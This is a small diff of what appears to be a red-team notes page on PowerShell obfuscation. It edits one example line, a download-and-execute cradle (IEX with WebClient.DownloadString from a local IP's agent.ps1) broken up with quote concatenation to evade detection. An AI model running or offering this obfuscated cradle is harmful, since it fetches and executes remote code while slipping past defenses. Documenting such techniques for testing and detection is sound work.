@@ -120,7 +120,7 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 
 - Using **powershell special caracters: '** and **+**
 
-      power'+'shell.exe IEX (New-Ob'+'ject Net.'+'WebCl'+'ient).Do'+'wnloadSt'+'ring('//19'+'2.16'+'8.1.71/agent.ps1')
+      power'+'shell IEX (New-Ob'+'ject Net.'+'WebCl'+'ient).Do'+'wnloadSt'+'ring('//192.16'+'8.1.71/agent.ps1')
 
 - Using an **batch** local variable inside powershell interpreter
 
